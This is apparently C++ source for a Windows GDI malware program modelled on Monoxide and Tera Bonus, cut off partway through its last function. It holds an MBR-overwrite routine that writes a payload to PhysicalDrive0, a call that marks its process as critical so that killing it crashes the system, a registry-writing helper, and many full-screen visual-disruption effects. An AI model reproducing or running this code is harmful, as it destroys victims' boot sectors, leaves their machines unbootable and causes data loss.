//inspired by Monoxide & Tera Bonus
#include <windows.h>
#include <tchar.h>
#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
#include "bootrec.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) {
	switch (stage) {
	case 0:
		r = 255; b = 0; g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255; b = 0; r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255; r = 0; b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255; r = 0; g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255; g = 0; r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255; g = 0; b > 0 ? b -= shift : stage = 0;
		break;
	}
	return RGB(r, g, b);
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
	srand(GetTickCount());
	WCHAR string[32];
	for (int i = 0; i < 32; i++) {
		string[i] = (WCHAR)(rand() % 256) + 1;
	}
	return string;
}

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 32768, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI plgblt(LPVOID lpParam) {
	RECT rect; POINT lpt[3];
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		GetWindowRect(GetDesktopWindow(), &rect);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		lpt[0].x = rect.left + rand() % 6;
		lpt[0].y = rect.top - rand() % 6;
		lpt[1].x = rect.right + rand() % 6;
		lpt[1].y = rect.top + rand() % 6;
		lpt[2].x = rect.left - rand() % 6;
		lpt[2].y = rect.bottom + rand() % 6;
		PlgBlt(mdc, lpt, mdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI gdi2(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		StretchBlt(hdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(hdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(hdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? SRCAND : SRCPAINT);
		StretchBlt(hdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? SRCAND : SRCPAINT);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI polygon(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(Hue(3));
		SelectObject(hdc, brush);
		POINT vertices[] = { { rand() % w, rand() % h }, { rand() % w, rand() % h }, { rand() % w, rand() % h } };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i * 4) + (i ^ 4) * cbrt(RGB(x ^ y, 0, 0)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI hell1(LPVOID lpParam) {
	int a = 0, b = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		float angle = 0.0;
		for (float z = 0.0; z < (float)(w / 1000); z = z + 0.001) {
			double xadd = sin((double)z);
			a = a + 1;
			double yadd = round((double)(angle * 50.0 + 0.0));
			BitBlt(mdc, a, yadd, 1, h, mdc, a, 0, NOTSRCERASE);
			BitBlt(mdc, a, h + yadd, 1, h, mdc, a, 0, NOTSRCERASE);
			BitBlt(mdc, a, yadd - h, 1, h, mdc, a, 0, NOTSRCERASE);
			if (w <= a) {
				a = 0;
			}
			angle = (float)xadd;
		}
		for (float j = 0.0; j < (float)(h / 1000); j = j + 0.001) {
			double xadd = sin((double)j);
			b = b + 1;
			double yadd = round((double)(angle * 50.0 + 0.0));
			BitBlt(mdc, yadd, b, w, 1, mdc, 0, b, NOTSRCERASE);
			BitBlt(mdc, w + yadd, b, w, 1, mdc, 0, b, NOTSRCERASE);
			BitBlt(mdc, yadd - w, b, w, 1, mdc, 0, b, NOTSRCERASE);
			if (h <= b) {
				b = 0;
			}
			angle = (float)xadd;
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI icons(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += y * 250;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmp = { 40, w, h, 1, 24 };
	PRGBTRIPLE rgbtriple;
	while (true) {
		hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h;
			rgbtriple[i].rgbtRed += GetRValue(x - y ^ y + x);
			rgbtriple[i].rgbtGreen += GetGValue(x - y ^ y + x);
			rgbtriple[i].rgbtBlue += GetBValue(x - y ^ y + x);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteDC(mdc); DeleteObject(hbit); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&w); DeleteObject(&h); DeleteObject(&bmp);
	}
}

DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int wp = w / 1, hp = h / 1;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int t = 0;
	double angle = 0.0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int cx = (x - (wp / 2));
			int cy = (y - (hp / 2));
			int zx = tan(angle) * cx - cos(angle) * cy;
			int zy = cos(angle) * cx + log(angle) * cy;
			int preset = (zx + t) + (zy + t);
			rgbScreen[i].r = preset;
			rgbScreen[i].b = preset;
		}
		t++;
		angle += 1.f;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI hsl1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(mdc, 0, 0, w, h, hdc, rand() % 10 + -10, rand() % 10 + -10, SRCINVERT);
		HBRUSH hbsh = CreateSolidBrush(Hue(3));
		SelectObject(mdc, hbsh);
		PatBlt(mdc, 0, 0, w, h, PATINVERT);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(bmp);
	}
}

DWORD WINAPI shell32(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HINSTANCE lib = LoadLibraryA("shell32.dll");
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 336)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI wave(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y <= h; y++) {
			HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(mdc, brush);
			BitBlt(mdc, (rand() % 11) - 5, y, w, 1, mdc, 0, y, 0x1900AC010E);
			DeleteObject(brush);
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI beziers(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SelectObject(hdc, CreatePen(PS_SOLID, 20, Hue(3)));
		POINT pps[4];
		for (int i = 0; i < 4; i++) {
			pps[i].x = rand() % w;
			pps[i].y = rand() % h;
		}
		PolyBezier(hdc, pps, 4);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
}

DWORD WINAPI gdi10(LPVOID lpParam) { //credits to anotheraccount, but i modified it
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = (rand() % 2);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		HPEN pen = CreatePen(PS_SOLID, 20, RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, pen);
		POINT pt[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
		StretchBlt(hdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? 0x00851E05 : 0x123456);
		StretchBlt(hdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? 0x00851E05 : 0x123456);
		StretchBlt(hdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? 0x00851E05 : 0x123456);
		StretchBlt(hdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, !(rand() % 2) ? 0x00851E05 : 0x123456);
		if (x == 0) {
			Polyline(hdc, pt, 4);
		}
		else if (x == 1) {
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
		};
		DeleteObject(pen);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)(y);
				rgbquad[index].rgbRed += x & y;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int wp = w / 16, hp = h / 16;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		StretchBlt(hdcMem, 0, 0, wp, hp, hdcScreen, 0, 0, w, h, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += rand();
			rgbScreen[i].g += rand();
			rgbScreen[i].b += rand();
		}
		StretchBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, wp, hp, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI train(LPVOID lpParam) {
	int j = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC mdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(mdc, 0, 0, w, h, mdc, 20, 30, SRCCOPY);
		BitBlt(mdc, 0, 0, w, h, mdc, 20 - w, 30, NOTSRCCOPY);
		BitBlt(mdc, 0, 0, w, h, mdc, 20, 30 - h, SRCCOPY);
		BitBlt(mdc, 0, 0, w, h, mdc, 20 - w, 30 - h, NOTSRCCOPY);
		j = j + 1;
		if (rand() % 12 <= j) {
			SelectObject(mdc, hbit);
			BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
			for (int z = 0; z < h; z = z + 2) {
				BitBlt(mdc, -25, z, w, 1, mdc, 0, z, SRCCOPY);
				BitBlt(mdc, w + -25, z, w, 1, mdc, 0, z, NOTSRCCOPY);
				BitBlt(mdc, 25, z + -1, w, 1, mdc, 0, z + -1, SRCCOPY);
				BitBlt(mdc, 25 - w, z + -1, w, 1, mdc, 0, z + -1, NOTSRCCOPY);
			}
			j = 0;
		}
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r = x ^ y;
			rgbScreen[i].g = x ^ y;
			rgbScreen[i].b *= x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI terabonus(LPVOID lpParam) {
	int tx = 1, ty = 1, x = 0, y = 0;
	for (int t = 0; ; t++) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, hbit);
		POINT points[3] = { {0, 0}, {0, 0}, {0, 0} };
		points[0] = { x, y };
		points[1] = { x + 7 * (h / 10), y + 7 * (h / 10) / 4 };
		points[2] = { x + 7 * (h / 10) / 4, y + 7 * (h / 10) };
		if (t % 5 == 0) {
			BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
		}
		else {
			BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		}
		x += tx * 20, y += ty * 20;
		if (x >= w - 7 * (h / 10) || x <= 0) {
			tx = -tx;
		}
		if (y >= 3 * (h / 10) || y <= 0) {
			ty = -ty;
		}
		HRGN hrgn = CreatePolygonRgn(points, 3, WINDING);
		SelectClipRgn(mdc, hrgn);
		SelectObject(mdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(mdc, x, y, 7 * (h / 10), 7 * (h / 10), PATINVERT);
		BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, mdc);
		DeleteObject(hdc); DeleteObject(mdc);
		DeleteObject(hbit); DeleteObject(hrgn);
		Sleep(10);
	}
}

DWORD WINAPI blur(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC mdc = CreateCompatibleDC(hdc);
		HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(mdc, bmp);
		BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, mdc, rand() % 5, rand() % 5, SRCCOPY);
		for (int i = 0; i < 30; i++) {
			int x = -199 + rand() % (w + 199);
			int y = -199 + rand() % (h + 199);
			BitBlt(mdc, x, y, 199, 199, mdc, x + rand() % 17 - 8, y + rand() % 17 - 8, SRCCOPY);
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, mdc, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		DeleteDC(mdc); DeleteObject(bmp);
	}
}

DWORD WINAPI textout(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HFONT hfnt = CreateFontA(rand() % 100, 0, rand() % 3600, rand() % 3600, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = { "cinnarizine", "N17Pro3426" };
		int thing = rand() % _countof(things);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
	if (xPower >= w) xPower = w - 1;
	if (yPower >= h) yPower = h - 1;
	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, hbit);
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
